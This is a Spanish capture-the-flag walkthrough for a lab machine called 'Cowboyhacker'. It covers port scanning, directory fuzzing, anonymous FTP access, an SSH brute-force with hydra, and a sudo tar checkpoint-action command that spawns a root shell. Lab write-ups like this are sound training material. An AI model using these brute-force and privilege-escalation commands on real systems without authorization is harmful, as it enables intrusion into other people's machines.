# Cowboyhacker

## Enumeración de puertos

Para empezar, ejecutaremos el siguiente escaneo para la enumeración de puertos:

```bash
nmap <ipdelamaquina>
```

![Untitled](Cowboyhacker%20d4134bfcc4044fd1bf4e8ca29482b82d/Untitled.png)

ssh port: 22

ftp port: 21

http port: 80

## Directory fuzzing

Vamos a intentar acceder a algún directorio oculto de la máquina haciendo fuerza bruta, mediante un diccionario:

```bash
gobuster dir -u [http://<ip_de_la_maquina>](http://%3Cip_de_la_maquina%3E/) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Untitled](Cowboyhacker%20d4134bfcc4044fd1bf4e8ca29482b82d/Untitled%201.png)

**Directorios encontrados con éxito:**

/images

/server-status

## FTP

Sabemos que FTP es un servicio bastante vulnerable.

Intentaremos acceder a él mediante credenciales comunes:

anonymous:anonymous

ftp:ftp

anonymous:

Conseguimos acceso al ftp de forma anónima, con el usuario “anonymous":

![Untitled](Cowboyhacker%20d4134bfcc4044fd1bf4e8ca29482b82d/Untitled%202.png)

Una vez tenemos acceso, listamos el directorio raíz, para ver el contenido:

![Untitled](Cowboyhacker%20d4134bfcc4044fd1bf4e8ca29482b82d/Untitled%203.png)

Una vez hecho esto, descargamos los ficheros de texto:

![Untitled](Cowboyhacker%20d4134bfcc4044fd1bf4e8ca29482b82d/Untitled%204.png)

Y examinamos su contenido:

![Untitled](Cowboyhacker%20d4134bfcc4044fd1bf4e8ca29482b82d/Untitled%205.png)

## SSH

### Ganando acceso a SSH

Intentamos acceder a SSH mediante fuerza bruta con el diccionario proporcionado por el fichero locks.txt (obtenido previamente del servidor FTP).

Comando para hacer fuerta bruta al login:

```bash
hydra -l lin -P locks.txt <ip_de_la_maquina> ssh
```

![Untitled](Cowboyhacker%20d4134bfcc4044fd1bf4e8ca29482b82d/Untitled%206.png)

Accedemos por SSH al usuario lin:

![Untitled](Cowboyhacker%20d4134bfcc4044fd1bf4e8ca29482b82d/Untitled%207.png)

Una vez tengamos acceso al SSH daríamos paso a una escalada de privilegios, porque tenemos que conseguir el fichero root.txt. Lo cual puede ser una pista de dónde se debe encontrar este fichero.

## Escalada de privilegios

Escalación de privilegios en un sistema linux:

1. Averiguamos qué comandos puede usar el usuario actual como root:

```bash
sudo -l
```

![Untitled](Cowboyhacker%20d4134bfcc4044fd1bf4e8ca29482b82d/Untitled%208.png)

2. Ahora sabemos que puede ejecutar “tar” como aministrador.

3. Buscamos un script de tar en [gtfobins](https://gtfobins.github.io/).

![Untitled](Cowboyhacker%20d4134bfcc4044fd1bf4e8ca29482b82d/Untitled%209.png)

4. Ejecutamos el comando:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

5. Una vez hecho esto, tenemos acceso a una shell donde nos podemos convertir en administradores:

![Untitled](Cowboyhacker%20d4134bfcc4044fd1bf4e8ca29482b82d/Untitled%2010.png)

6. Hecho esto, es cuestión de buscar el root.txt:

![Untitled](Cowboyhacker%20d4134bfcc4044fd1bf4e8ca29482b82d/Untitled%2011.png)

## Resumen del documento:

1. **Ports:**

> SSH port: 22
> 

> FTPport: 21
> 

> HTTP port: 80
> 

2. **FTP login:**

user: anonymous

pwd: 

3. **Directory fuzzing:**

```bash
gobuster dir -u http://<ipdelamaquina> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Directorios obtenidos:**

> /images
> 

> /server-status
> 

4. **Nombre del escritor de task.txt (ver en archivo)**


5. **SSH login**


- **ssh bruteforce command:**

   user: lin

   password: ******************

- **user.txt** **flag**

6. **Privilege escalation**:

- **Comandos que lin puede usar como root (**sudo -l**):**

    > /bin/tar
    > 

- **Comando tar usado para obtener una shell con privilegios:**

    ```bash
    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
    ```

- **Usando una shell como usuario root**

    ```bash
    sudo su 
    ```

7. **Buscamos el archivo root.txt**

  Buscamos en el directorio del usuario root una vez somos root

```bash
cd ~
```